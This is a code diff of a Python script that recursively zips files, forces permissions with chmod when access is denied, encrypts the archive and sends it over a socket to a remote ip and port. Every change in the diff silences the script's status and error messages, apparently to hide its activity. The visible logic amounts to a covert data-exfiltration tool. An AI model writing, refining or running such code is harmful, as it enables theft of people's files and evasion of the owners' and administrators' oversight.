@@ -35,7 +35,7 @@ def fix_permission(path):
         os.chmod(path, 0o755)
         return True
     except Exception:
-        print(f"[!] Could not chmod: {path}")
+        #print(f"[!] Could not chmod: {path}")
         return False
 
 
@@ -58,7 +58,7 @@ with zipfile.ZipFile(
 
                 full_path = os.path.join(root, dirname)
 
-                print(f"[DIR ] {full_path}")
+                #print(f"[DIR ] {full_path}")
 
                 try:
 
@@ -76,10 +76,10 @@ with zipfile.ZipFile(
 
                                 zf.write(fp, arcname)
 
-                                print(f"  [+] {arcname}")
+                                #print(f"  [+] {arcname}")
 
                             except PermissionError:
-                                print(f"  [DENIED] {fp}")
+                                #print(f"  [DENIED] {fp}")
 
                                 try:
                                     fix_permission(fp)
@@ -88,10 +88,12 @@ with zipfile.ZipFile(
                                     pass
 
                             except Exception as e:
-                                print(f"  [ERROR] {fp}: {e}")
+                                pass
+                                #print(f"  [ERROR] {fp}: {e}")
 
                 except Exception as e:
-                    print(f"[ERROR] {full_path}: {e}")
+                    #print(f"[ERROR] {full_path}: {e}")
+                    pass
 
         #
         # MATCH FILES
@@ -102,7 +104,7 @@ with zipfile.ZipFile(
 
                 fp = os.path.join(root, filename)
 
-                print(f"[FILE] {fp}")
+                #print(f"[FILE] {fp}")
 
                 try:
                     arcname = os.path.relpath(
@@ -113,10 +115,12 @@ with zipfile.ZipFile(
                     zf.write(fp, arcname)
 
                 except PermissionError:
-                    print(f"  [DENIED] {fp}")
+                    #print(f"  [DENIED] {fp}")
+                    pass 
 
                 except Exception as e:
-                    print(f"  [ERROR] {fp}: {e}")
+                    pass
+                    #print(f"  [ERROR] {fp}: {e}")
 
 
 #
@@ -141,7 +145,7 @@ encrypted_blob = nonce+ciphertext
 with open(OUTPUT_ZIP, "wb") as f:
     f.write(encrypted_blob)
 
-print(f"\n[+] ZIP WRITTEN: {OUTPUT_ZIP}")
+#print(f"\n[+] ZIP WRITTEN: {OUTPUT_ZIP}")
 
 
 with socket.create_connection((ip,port)) as s:
@@ -149,6 +153,6 @@ with socket.create_connection((ip,port)) as s:
 
     s.sendall(encrypted_blob)
 
-    print(f'[+] sent {len(encrypted_blob)} bytes')
+    #print(f'[+] sent {len(encrypted_blob)} bytes')
 
 
